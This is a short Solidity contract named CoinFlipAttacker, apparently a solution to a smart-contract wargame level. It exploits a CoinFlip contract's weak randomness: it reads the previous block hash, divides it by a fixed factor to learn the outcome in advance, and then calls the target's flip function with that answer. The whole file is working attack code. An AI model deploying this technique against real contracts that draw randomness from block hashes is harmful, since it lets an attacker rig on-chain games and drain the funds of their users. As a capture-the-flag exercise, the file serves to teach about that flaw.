// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import './CoinFlip.sol';
import "hardhat/console.sol";

contract CoinFlipAttacker {

  using SafeMath for uint256;
  CoinFlip coinFlipContract;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlip) public {
    coinFlipContract = CoinFlip(_coinFlip);
  }

  function attack() public returns (bool){
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    bool success = coinFlipContract.flip(side);
    return success;
  }
}